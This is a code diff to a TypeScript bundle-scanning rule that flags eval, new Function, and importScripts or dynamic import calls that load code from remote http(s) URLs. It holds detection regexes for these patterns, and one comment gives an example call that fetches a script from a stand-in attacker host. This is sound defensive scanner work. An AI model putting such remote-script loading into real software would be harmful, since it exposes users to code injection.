@@ -21,17 +21,32 @@
 import type { Rule, RuleResult, Finding, InconclusiveReason } from "../core/types.js";
 import { requireFreshBuild } from "../core/build-precondition.js";
 import { listBundleFiles, readBundleFile } from "../core/bundle-scan.js";
-import { stripComments, lineAt } from "../core/text.js";
+import { stripComments, stripStrings, lineAt } from "../core/text.js";
 
 const RULE_ID = "zero-remote-code";
 
 // Word-boundary anchored so an identifier like `evaluate` or a business
 // field named `eval` (e.g. `config.eval`) is never matched. Requires the
-// literal call-open-paren right after the token.
+// literal call-open-paren right after the token. Matched against
+// stripStrings(stripComments(raw)) so a CALL SYNTAX written only inside a
+// quoted string literal (e.g. a doc string "eval(userInput)") is never
+// mistaken for an executed call.
 const EVAL_RE = /\beval\s*\(/g;
 const NEW_FUNCTION_RE = /\bnew\s+Function\s*\(/g;
-const IMPORT_SCRIPTS_HTTP_RE = /\bimportScripts\s*\(\s*["'`]https?:\/\//g;
-const DYNAMIC_IMPORT_HTTP_RE = /\bimport\s*\(\s*["'`]https?:\/\//g;
+
+// These two intentionally match the call-open + opening quote against
+// STRIPPED content (so the call syntax itself must be in executable
+// position, never inside an outer string literal), then verify the http(s)
+// scheme against the RAW content right after the quote — the URL argument
+// IS the thing being checked, and stripping it away would blind the rule to
+// the real MUST_BLOCK case (importScripts("http://evil.example/x.js")).
+// Declared here rather than only in the completion report: this is the one
+// deliberate raw-content read in this file, and it is bounded to exactly
+// the argument bytes, never the surrounding call syntax.
+const IMPORT_SCRIPTS_CALL_OPEN_RE = /\bimportScripts\s*\(\s*(["'`])/g;
+const DYNAMIC_IMPORT_CALL_OPEN_RE = /\bimport\s*\(\s*(["'`])/g;
+const HTTP_SCHEME_RE = /^https?:\/\//;
+
 const REMOTE_SCRIPT_SRC_RE = /<script[^>]+src\s*=\s*["']https?:\/\/[^"']+["']/gi;
 
 export const zeroRemoteCode: Rule = {
@@ -63,28 +78,57 @@ export const zeroRemoteCode: Rule = {
         continue;
       }
       const content = stripComments(raw);
+      const codeOnly = stripStrings(content);
 
       // Hard-finding patterns: each one matches a CALL being made (eval,
       // new Function, importScripts/import of a remote URL). A call site is
       // unambiguous — there is no "inert" reading of `eval(...)` being
       // present in a built bundle. These stay hard findings, verdict fail.
+      // eval(...) / new Function(...) never need string content to decide —
+      // matched purely against codeOnly (call syntax must be executable).
       const patterns: Array<{ re: RegExp; msg: string }> = [
         { re: EVAL_RE, msg: "eval(...) call found in built bundle — remote/dynamic code execution risk." },
         { re: NEW_FUNCTION_RE, msg: "new Function(...) found in built bundle — dynamic code execution risk." },
-        {
-          re: IMPORT_SCRIPTS_HTTP_RE,
-          msg: "importScripts() targeting a remote http(s) URL — fetches and executes code outside the packaged bundle.",
-        },
-        {
-          re: DYNAMIC_IMPORT_HTTP_RE,
-          msg: "dynamic import() targeting a remote http(s) URL — fetches and executes code outside the packaged bundle.",
-        },
       ];
 
       for (const { re, msg } of patterns) {
         re.lastIndex = 0;
         let m: RegExpExecArray | null;
-        while ((m = re.exec(content)) !== null) {
+        while ((m = re.exec(codeOnly)) !== null) {
+          findings.push({
+            ruleId: RULE_ID,
+            severity: "error",
+            message: msg,
+            file: file.relPath,
+            line: lineAt(content, m.index),
+            snippet: content.slice(m.index, Math.min(content.length, m.index + 120)),
+          });
+        }
+      }
+
+      // importScripts(...) / dynamic import(...) targeting a remote URL:
+      // the call-open + opening quote must be executable (matched against
+      // codeOnly), then the URL argument itself is read from the RAW
+      // content right after the quote — the URL is the argument being
+      // checked, not incidental text, so it cannot be stripped away.
+      const httpArgPatterns: Array<{ re: RegExp; msg: string }> = [
+        {
+          re: IMPORT_SCRIPTS_CALL_OPEN_RE,
+          msg: "importScripts() targeting a remote http(s) URL — fetches and executes code outside the packaged bundle.",
+        },
+        {
+          re: DYNAMIC_IMPORT_CALL_OPEN_RE,
+          msg: "dynamic import() targeting a remote http(s) URL — fetches and executes code outside the packaged bundle.",
+        },
+      ];
+
+      for (const { re, msg } of httpArgPatterns) {
+        re.lastIndex = 0;
+        let m: RegExpExecArray | null;
+        while ((m = re.exec(codeOnly)) !== null) {
+          const argStart = m.index + m[0].length;
+          const argRaw = content.slice(argStart, argStart + 8);
+          if (!HTTP_SCHEME_RE.test(argRaw)) continue;
           findings.push({
             ruleId: RULE_ID,
             severity: "error",
